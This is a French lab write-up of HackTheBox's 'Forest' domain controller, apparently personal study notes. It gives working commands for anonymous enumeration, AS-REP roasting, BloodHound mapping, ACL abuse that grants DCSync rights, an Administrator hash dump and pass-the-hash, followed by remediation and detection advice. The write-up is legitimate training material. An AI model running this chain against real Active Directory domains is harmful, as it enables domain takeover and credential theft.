# Forest — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server (contrôleur de domaine) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-09-29 |
| **Vecteur** | Énum. anonyme → **AS-REP roast** `svc-alfresco` → BloodHound → **Account Operators → Exchange Windows Permissions → WriteDacl** → **DCSync** → hash Administrator → PtH |
| **CVE** | aucune — abus de configuration Active Directory |
| **Tags** | active-directory · as-rep-roast · bloodhound · acl-abuse · dcsync |

> `<IP_CIBLE>` = IP de session. tun0 = `10.10.14.x` · cible = `10.129.x.x`.
> ⚙️ Ajoute le domaine dans `/etc/hosts` dès que tu le connais : `<IP_CIBLE>  htb.local  forest.htb.local`.

> 🎯 **Phase 4 — ta 1re compromission Active Directory complète.** C'est LE sujet d'entretien
> (« compromettre un domaine sans identifiants »). Objectif : dérouler `smb` → `ad-attacks` →
> `bloodhound` → `impacket` → `hashcat` de bout en bout. Prends des notes serrées : cette box
> te servira de fil rouge à l'oral.

---

## TL;DR

Le DC `htb.local` autorise une **session nulle** → énumération des utilisateurs (`rpcclient enumdomusers`).
Parmi eux, le compte de service **`svc-alfresco`** a la **pré-authentification Kerberos désactivée** →
**AS-REP roasting** : on récupère un hash cassable hors ligne → mot de passe `s3rvice`. Connexion en
**Evil-WinRM** (user flag). BloodHound révèle un chemin : `svc-alfresco` est (par groupes imbriqués)
membre d'**Account Operators**, qui a `GenericAll` sur **Exchange Windows Permissions**, groupe qui
détient **`WriteDacl` sur le domaine**. On crée un compte, on l'ajoute à Exchange Windows Permissions,
puis via ce WriteDacl on s'octroie les droits **DCSync** → dump du hash **Administrator** → **Pass-the-Hash**.

**Énum anonyme → AS-REP roast (`svc-alfresco`) → BloodHound → Account Operators → Exchange Windows Permissions (WriteDacl) → DCSync → hash Administrator → PtH → DC compromis.**

---

## 1. Reconnaissance

```bash
└─$ nmap -sC -sV -oA forest <IP_CIBLE>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-29 15:28 +0200
Nmap scan report for <IP_CIBLE>
Host is up (0.054s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-09-29 13:42:01Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-29T13:42:09
|_  start_date: 2026-09-29T13:17:22
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-09-29T06:42:08-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 388.41 seconds

```

Ports attendus sur un **DC** — sache les reconnaître :

| Port | Service | Ce que ça signale |
| --- | --- | --- |
| 53 | DNS | contrôleur de domaine |
| 88 | Kerberos | authentification AD |
| 135/139/445 | RPC/SMB | énumération, partages |
| 389/636/3268 | LDAP/LDAPS/GC | annuaire → objets, users |
| 5985 | WinRM | accès distant (Evil-WinRM) une fois des creds en main |

- Domaine / hostname relevés : **`htb.local`** / **`FOREST`** (Windows Server 2016) → dans `/etc/hosts` : `<IP_CIBLE>  htb.local forest.htb.local`.

> Le `smb-os-discovery` de nmap te donne **domaine + forêt + FQDN** d'un coup : `Domain name: htb.local`, `Forest name: htb.local`. C'est ton point de départ pour toute la suite AD.

---

## 2. Énumération AD (sans identifiants)

Beaucoup de DC autorisent une **session nulle** (anonyme) qui laisse **énumérer les utilisateurs**.

```bash
# Énumérer les comptes du domaine sans creds
┌──(kali㉿kali)-[~/Téléchargements]
└─$ enum4linux -A <IP_CIBLE>
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 29 18:44:28 2026

 =========================================( Target Information )=========================================

Target ........... <IP_CIBLE>
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ===========================( Enumerating Workgroup/Domain on <IP_CIBLE> )===========================

[E] Can't find workgroup/domain
 ===================================( Session Check on <IP_CIBLE> )===================================

[+] Server <IP_CIBLE> allows sessions using username '', password ''
 ================================( Getting domain SID for <IP_CIBLE> )================================

Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565

[+] Host is part of a domain (not a workgroup)

enum4linux complete on Tue Sep 29 18:44:39 2026
```

```bash
(kali㉿kali)-[~/Téléchargements]
└─$ rpcclient -U '' -N <IP_CIBLE>
rpcclient $> dir
command not found: dir
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
```bash
┌──(kali㉿kali)-[~/Téléchargements]
└─$ nxc smb <IP_CIBLE> -u '' -p ''    
SMB         <IP_CIBLE>   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         <IP_CIBLE>   445    FOREST           [+] htb.local\: 
```
# LDAP anonyme si autorisé
```bash
┌──(kali㉿kali)-[~/Téléchargements]
└─$ ldapsearch -x -H ldap://10.129.95.210 -b "dc=htb.local"
# extended LDIF
#
# LDAPv3
# base <dc=htb.local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 10 Referral
text: 0000202B: RefErr: DSID-031007F9, data 0, 1 access points
        ref 1: 'htb.loc
 al'

ref: ldap://htb.local/dc=htb.local

# numResponses: 1
```

- Liste d'utilisateurs obtenue : comptes réels `sebastien`, `lucinda`, `andy`, `mark`, `santi` et surtout **`svc-alfresco`** (les `SM_*` et `HealthMailbox*` sont des comptes système Exchange, à ignorer).
- Repère les **comptes de service** (`svc-…`) : ce sont les cibles Kerberos privilégiées.

> **Pourquoi la session nulle marche ici** : le DC accepte une connexion SMB anonyme (`Null Auth: True`)
> et RPC laisse appeler `enumdomusers`. C'est une **mauvaise configuration** (héritée d'anciens niveaux
> fonctionnels / présence d'Exchange qui assouplit les ACL). Sur un AD durci, `restrictanonymous` bloque ça.
>
> Astuce : garde ta liste d'users dans un fichier pour la suite → `rpcclient ... enumdomusers | grep -oP '\[.*?\]' ... > users.txt`.

---

## 3. Accès initial (foothold) — AS-REP Roasting

### Le mécanisme (à savoir réexpliquer à l'oral)

Kerberos exige normalement une **pré-authentification** : dans l'`AS-REQ`, le client prouve qu'il
connaît le mot de passe en chiffrant un **timestamp** avec la clé dérivée de ce mot de passe. Le KDC
ne répond que si ce timestamp est valide.

Si le drapeau **« Do not require Kerberos pre-authentication »** (`DONT_REQ_PREAUTH` dans le
`userAccountControl`) est activé sur un compte, **le KDC répond sans cette preuve** : il renvoie un
`AS-REP` dont une partie est **chiffrée avec la clé du mot de passe** du compte. N'importe qui peut donc
demander ce blob **pour ce compte, sans mot de passe**, et le **casser hors ligne** → on retrouve le mot de passe.

### Exploitation

```bash
# 1) Lister les comptes sans pré-auth et récupérer leur hash AS-REP
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
# (svc-alfresco ressort → hash $krb5asrep$23$svc-alfresco@HTB.LOCAL:...)

# 2) Casser hors ligne (mode 18200 = AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

- Compte vulnérable : **`svc-alfresco`** (pré-auth désactivée)
- Mot de passe cassé : **`s3rvice`**
- Connexion en **WinRM** (port 5985 vu au nmap) :
```bash
evil-winrm -i <IP_CIBLE> -u svc-alfresco -p 's3rvice'
```

**Flag user :** `C:\Users\svc-alfresco\Desktop\user.txt` (non publié).

> `-m 18200` = AS-REP roasting ; à ne pas confondre avec **`-m 13100`** = Kerberoasting (tickets de service SPN).
> Si aucun compte n'a la pré-auth désactivée, `GetNPUsers` ne renvoie rien : c'est normal, on passe à autre chose.

---

## 4. Cartographie des chemins — BloodHound

Une fois un compte valide, collecte les données AD et cherche le **chemin vers Domain Admin**.

```bash
# Collecte à distance (Python). ⚠️ BloodHound CE (PostgreSQL+neo4j) → collecteur CE :
bloodhound-ce-python -u svc-alfresco -p 's3rvice' -d htb.local -ns <IP_CIBLE> -c All --zip
# → interface CE sur http://localhost:8080 → ⚙ Administration → File Ingest → Upload le .zip
# → Mark svc-alfresco as Owned → "Shortest Path to Domain Admins from Owned Principals"
```

**Le chemin de Forest** (chaque flèche = une arête à abuser) :

```
svc-alfresco
   └─MemberOf→ Service Accounts
        └─MemberOf→ Privileged IT Accounts
             └─MemberOf→ Account Operators          (groupe intégré privilégié)
                  └─GenericAll→ Exchange Windows Permissions
                       └─WriteDacl→ HTB.LOCAL (domaine)
                            └─(on s'octroie)→ DCSync
```

- **Ce que chaque droit permet** :
  - **Account Operators** : groupe intégré qui peut **créer des comptes** et les **ajouter à la plupart des groupes** (sauf groupes protégés).
  - **`GenericAll` sur Exchange Windows Permissions** : contrôle total du groupe → je peux **y ajouter un membre**.
  - **`WriteDacl` sur le domaine** : Exchange Windows Permissions peut **modifier la DACL de l'objet domaine** → donc **s'accorder n'importe quel droit**, dont la réplication (DCSync).

> ⚠️ Piège que j'ai rencontré : `svc-alfresco` **n'a PAS** le WriteDacl directement. Tenter le `dacledit`
> avec lui → `INSUFF_ACCESS_RIGHTS`. Il faut **suivre chaque arête** : passer par un compte que je crée
> et que je place dans Exchange Windows Permissions.

---

## 5. Élévation de privilèges — abus d'ACL → DCSync

**Enchaînement réel** (depuis Kali, en tant que `svc-alfresco`), en suivant le chemin BloodHound arête par arête :

```bash
D=htb.local; DC=<IP_CIBLE>; U='svc-alfresco'; P='s3rvice'

# 1) Account Operators → créer un compte à moi
net rpc user add hacker 'P@ssw0rd123!' -U "$D/$U%$P" -S $DC
#   [Added user 'hacker']

# 2) l'ajouter à Exchange Windows Permissions (le groupe qui détient le WriteDacl)
net rpc group addmem "Exchange Windows Permissions" hacker -U "$D/$U%$P" -S $DC

# 3) en tant que hacker (membre d'EWP → WriteDacl domaine), s'octroyer DCSync
impacket-dacledit -action write -rights DCSync -principal hacker \
  -target-dn "DC=htb,DC=local" "$D/hacker:P@ssw0rd123!" -dc-ip $DC
#   [DACL modified successfully!]

# 4) DCSync : demander la réplication du secret de l'Administrateur
impacket-secretsdump "$D/hacker:P@ssw0rd123!"@$DC -just-dc-user Administrator
#   Administrator:500:aad3b...:<NThash>:::

# 5) Pass-the-Hash → shell Administrator sur le DC
evil-winrm -i $DC -u Administrator -H <NThash>
```

> ⚠️ **Bash** : utiliser des **guillemets doubles** `"$D/hacker:..."` pour que `$D` soit remplacé.
> En simples `'...'`, la variable n'est pas expansée (ça a marché quand même ici car impacket
> s'authentifie en NTLM via `-dc-ip`, mais c'est un coup de chance).

- Résultat : **`htb\administrator`** — DC compromis, contrôle total du domaine.
- **Pourquoi DCSync marche (pour l'oral)** : les droits de réplication (`DS-Replication-Get-Changes`
  + `-All`) sont ceux qu'un **contrôleur de domaine** utilise pour se synchroniser avec ses pairs.
  En me les octroyant (via le WriteDacl), je peux **demander au DC de me répliquer les secrets**
  (les hashes NTLM de tous les comptes, dont l'Administrateur) **comme si j'étais un DC**. Ensuite,
  le **Pass-the-Hash** me connecte avec le hash NT **sans jamais connaître le mot de passe en clair**.

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

### Nettoyage (réflexe pentest, pas red team)

J'ai créé un compte et modifié la DACL du domaine → en mission on **documente et on retire** :
```bash
# restaurer la DACL depuis la sauvegarde auto générée par dacledit
impacket-dacledit -action restore -file dacledit-<date>.bak "$D/hacker:P@ssw0rd123!" -dc-ip $DC
# supprimer le compte créé
net rpc user delete hacker -U "$D/$U%$P" -S $DC
```

---

## 6. Remédiation

- **AS-REP** : activer la pré-authentification Kerberos sur tous les comptes ; mots de passe de service longs (gMSA).
- **Session nulle** : désactiver l'énumération anonyme (restrictanonymous).
- **ACL** : revoir les droits `WriteDacl`/`GenericAll` sur l'objet domaine et les groupes à privilèges (Account Operators, Exchange Windows Permissions).
- **DCSync** : restreindre les droits de réplication (`DS-Replication-Get-Changes`) aux seuls DC.

---

## 7. Côté Blue Team — détection

| Étape | Trace / Event | Détection |
| --- | --- | --- |
| Énum. anonyme | connexions SMB/LDAP anonymes, requêtes en masse | alerte sur session nulle, pic d'énumération |
| AS-REP roast | **4768** (TGT demandé) pour un compte sans pré-auth, chiffrement RC4 | règle Sigma AS-REP |
| BloodHound | requêtes LDAP massives (SharpHound) | volume LDAP anormal depuis un compte |
| Abus d'ACL | **5136** (modification d'objet AD / DACL) | alerte sur modification d'ACL du domaine |
| DCSync | **4662** réplication depuis un hôte **non-DC** | la détection reine de l'AD |

---

## 8. Leçons

- **On attaque un DOMAINE, pas une machine.** Le foothold (`svc-alfresco`) n'est qu'une porte d'entrée ; l'objectif est le **contrôle du domaine** (DA / DCSync), atteint par des **abus de configuration**, pas des CVE.
- **La chaîne AD type** : énumérer (session nulle) → **roaster** (AS-REP) → **cartographier** (BloodHound) → **abuser une ACL** (WriteDacl) → **DCSync** → PtH. C'est le squelette réutilisable sur toute box AD.
- **Suivre le chemin BloodHound arête par arête.** `INSUFF_ACCESS_RIGHTS` = « ce principal n'a pas ce droit » → je n'ai pas respecté une étape intermédiaire. Ici : Account Operators (créer un pion) → Exchange Windows Permissions (WriteDacl) → *ce pion* fait le dacledit.
- **Les 3 notions à réexpliquer à l'oral** :
  1. **AS-REP roasting** : compte sans pré-auth → blob chiffré avec sa clé → cassable hors ligne (`-m 18200`).
  2. **DCSync** : s'octroyer les droits de réplication → demander les secrets au DC comme un DC.
  3. **Lecture d'un chemin BloodHound** : nœuds = comptes/groupes, arêtes = droits ; onglet **Linux/Windows Abuse** = OS depuis lequel je lance les commandes.
- **Piège BloodHound CE** : PostgreSQL + neo4j, interface sur **8080** (pas le Neo4j Browser 7474) ; collecteur **CE** obligatoire (`bloodhound-ce-python`), sinon l'import est refusé. Erreur de collation PostgreSQL réglée par `ALTER DATABASE ... REFRESH COLLATION VERSION`.
- **Piège bash** : `'...'` n'expanse pas les variables, `"..."` oui.

---

## Références

- HackTricks — AD methodology : <https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/>
- Fiches liées : [nmap](../outils/nmap.md) · [smb](../outils/smb.md) · [ad-attacks](../outils/ad-attacks.md) · [bloodhound](../outils/bloodhound.md) · [impacket](../outils/impacket.md) · [hashcat](../outils/hashcat.md)
